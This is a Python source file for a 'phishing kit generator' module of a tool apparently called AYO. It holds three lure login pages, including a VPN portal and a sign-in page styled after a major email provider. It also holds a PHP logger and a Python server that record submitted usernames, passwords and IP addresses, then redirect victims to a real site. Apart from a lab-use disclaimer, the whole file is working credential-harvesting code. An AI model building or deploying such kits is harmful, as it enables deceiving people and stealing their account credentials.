# ═══════════════════════════════════════════
#  AYO — Module [1]: Phishing Kit Generator
# ═══════════════════════════════════════════

import os
import datetime

RED   = "\033[91m"
DRED  = "\033[31m"
WHITE = "\033[97m"
GRAY  = "\033[90m"
YELLOW= "\033[93m"
BOLD  = "\033[1m"
DIM   = "\033[2m"
RESET = "\033[0m"

TEMPLATES = {
    "1": {
        "name": "Generic Login Portal",
        "html": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}}
  .card{{background:#fff;padding:2rem;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);width:360px}}
  .logo{{text-align:center;font-size:1.5rem;font-weight:700;color:#1a1a2e;margin-bottom:1.5rem}}
  input{{width:100%;padding:.75rem;border:1px solid #ddd;border-radius:4px;margin-bottom:1rem;font-size:.95rem}}
  button{{width:100%;padding:.75rem;background:#1a1a2e;color:#fff;border:none;border-radius:4px;font-size:1rem;cursor:pointer}}
  button:hover{{background:#16213e}}
  .footer{{text-align:center;margin-top:1rem;font-size:.75rem;color:#888}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">{title}</div>
  <form action="capture.php" method="POST">
    <input type="text" name="username" placeholder="Username or Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Sign In</button>
  </form>
  <div class="footer">&copy; {year} {title}. All rights reserved.</div>
</div>
</body>
</html>"""
    },
    "2": {
        "name": "Corporate VPN Portal",
        "html": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} — Secure Access</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{font-family:'Segoe UI',sans-serif;background:#0a192f;display:flex;justify-content:center;align-items:center;min-height:100vh}}
  .card{{background:#112240;padding:2.5rem;border:1px solid #1e3a5f;border-radius:4px;width:400px}}
  .logo{{color:#64ffda;font-size:1.2rem;font-weight:600;margin-bottom:.5rem}}
  .subtitle{{color:#8892b0;font-size:.85rem;margin-bottom:2rem}}
  label{{color:#8892b0;font-size:.8rem;letter-spacing:1px;text-transform:uppercase}}
  input{{width:100%;padding:.7rem;background:#0a192f;border:1px solid #1e3a5f;border-radius:3px;color:#ccd6f6;margin:.4rem 0 1rem;font-size:.95rem}}
  input:focus{{outline:none;border-color:#64ffda}}
  button{{width:100%;padding:.75rem;background:#64ffda;color:#0a192f;border:none;border-radius:3px;font-weight:700;cursor:pointer;letter-spacing:1px}}
  .warn{{color:#ff6b6b;font-size:.75rem;margin-top:1rem;text-align:center}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">🔒 {title}</div>
  <div class="subtitle">Secure Employee Access Portal</div>
  <form action="capture.php" method="POST">
    <label>Employee ID / Email</label>
    <input type="text" name="username" placeholder="you@company.com" required>
    <label>Password</label>
    <input type="password" name="password" placeholder="••••••••" required>
    <button type="submit">AUTHENTICATE</button>
  </form>
  <div class="warn">⚠ Unauthorized access is monitored and will be prosecuted.</div>
</div>
</body>
</html>"""
    },
    "3": {
        "name": "Email Credential Harvest",
        "html": """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Sign in — {title}</title>
<style>
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{font-family:Roboto,Arial,sans-serif;background:#fff;display:flex;flex-direction:column;align-items:center;padding-top:60px}}
  .logo{{font-size:1.8rem;font-weight:300;color:#202124;margin-bottom:1.5rem}}
  .logo span{{color:#4285f4}}
  .card{{width:350px;border:1px solid #dadce0;border-radius:8px;padding:2rem}}
  h2{{font-size:1.4rem;font-weight:400;color:#202124;margin-bottom:.5rem}}
  p{{font-size:.875rem;color:#5f6368;margin-bottom:1.5rem}}
  input{{width:100%;padding:.75rem;border:1px solid #dadce0;border-radius:4px;font-size:1rem;margin-bottom:1.2rem}}
  input:focus{{outline:none;border-color:#4285f4;box-shadow:0 0 0 2px rgba(66,133,244,.2)}}
  .next{{background:#1a73e8;color:#fff;border:none;padding:.75rem 1.5rem;border-radius:4px;cursor:pointer;font-size:.9rem;float:right}}
</style>
</head>
<body>
<div class="logo">{title}<span>.</span></div>
<div class="card">
  <h2>Sign in</h2>
  <p>Use your {title} Account</p>
  <form action="capture.php" method="POST">
    <input type="email" name="username" placeholder="Email or phone" required>
    <input type="password" name="password" placeholder="Enter your password" required>
    <button class="next" type="submit">Next</button>
  </form>
</div>
</body>
</html>"""
    }
}

CAPTURE_PHP = """<?php
// AYO Phishing Kit — Credential Capture (Lab Use Only)
$log = "captured.txt";
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $user = htmlspecialchars($_POST["username"] ?? "");
    $pass = htmlspecialchars($_POST["password"] ?? "");
    $ip   = $_SERVER["REMOTE_ADDR"];
    $time = date("Y-m-d H:i:s");
    $entry = "[$time] IP: $ip | User: $user | Pass: $pass\\n";
    file_put_contents($log, $entry, FILE_APPEND);
    // Redirect to real site after capture
    header("Location: https://example.com");
    exit();
}
?>"""

CAPTURE_PY = """#!/usr/bin/env python3
# AYO Phishing Kit — Python capture server (no PHP needed)
# Run: python3 capture_server.py
# Then set form action="http://localhost:8080/capture"

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse
import datetime

LOG_FILE = "captured.txt"

class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): pass  # suppress default logs

    def do_POST(self):
        if "/capture" in self.path:
            length = int(self.headers.get("Content-Length", 0))
            body   = self.rfile.read(length).decode()
            params = parse_qs(body)
            user   = params.get("username", [""])[0]
            pw     = params.get("password", [""])[0]
            ip     = self.client_address[0]
            ts     = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry  = f"[{ts}] IP: {ip} | User: {user} | Pass: {pw}\\n"
            with open(LOG_FILE, "a") as f:
                f.write(entry)
            print(f"\\033[91m[CAPTURED]\\033[0m {entry.strip()}")
            self.send_response(302)
            self.send_header("Location", "https://example.com")
            self.end_headers()

if __name__ == "__main__":
    print("\\033[91m[AYO]\\033[0m Capture server running on http://localhost:8080")
    print("\\033[90mLog file: captured.txt\\033[0m")
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
"""

def phishing_banner():
    print(f"""
{DRED}╔══════════════════════════════════════════════╗
║       PHISHING KIT GENERATOR — MODULE [1]    ║
╚══════════════════════════════════════════════╝{RESET}
{DIM}Generate credential harvest pages for authorized phishing simulations.{RESET}
""")

def run_phishing():
    phishing_banner()

    while True:
        print(f"  {RED}[1]{RESET} Generate phishing page")
        print(f"  {RED}[2]{RESET} View available templates")
        print(f"  {RED}[b]{RESET} Back\n")

        choice = input(f"  {RED}[phish]>{RESET} ").strip().lower()

        if choice == "1":
            print(f"\n  {WHITE}Select template:{RESET}")
            for k, v in TEMPLATES.items():
                print(f"  {RED}[{k}]{RESET} {v['name']}")
            print()

            tmpl = input(f"  {RED}[phish]>{RESET} Template number: ").strip()
            if tmpl not in TEMPLATES:
                print(f"  {YELLOW}[!] Invalid template.{RESET}\n")
                continue

            title   = input(f"  {RED}[phish]>{RESET} Site/Brand name (e.g. 'CompanyPortal'): ").strip()
            out_dir = input(f"  {RED}[phish]>{RESET} Output folder name (default: phish_kit): ").strip()
            if not out_dir:
                out_dir = "phish_kit"

            os.makedirs(out_dir, exist_ok=True)
            year = datetime.datetime.now().year

            html = TEMPLATES[tmpl]["html"].format(title=title, year=year)

            with open(os.path.join(out_dir, "index.html"), "w") as f:
                f.write(html)
            with open(os.path.join(out_dir, "capture.php"), "w") as f:
                f.write(CAPTURE_PHP)
            with open(os.path.join(out_dir, "capture_server.py"), "w") as f:
                f.write(CAPTURE_PY)

            print(f"""
  {RED}[+] Phishing kit generated → ./{out_dir}/{RESET}
      {GRAY}index.html       — lure page{RESET}
      {GRAY}capture.php      — PHP credential logger{RESET}
      {GRAY}capture_server.py— Python capture server (no PHP needed){RESET}

  {DIM}To serve locally:{RESET}
      {WHITE}cd {out_dir} && python3 -m http.server 8000{RESET}
      {WHITE}python3 capture_server.py{RESET}  (in separate terminal)

  {DRED}⚠ For authorized lab & CTF use only.{RESET}\n""")

        elif choice == "2":
            print(f"\n  {WHITE}Available Templates:{RESET}")
            for k, v in TEMPLATES.items():
                print(f"  {RED}[{k}]{RESET} {v['name']}")
            print()

        elif choice in ["b", "back"]:
            break
        else:
            print(f"  {YELLOW}[!] Invalid option.{RESET}\n")
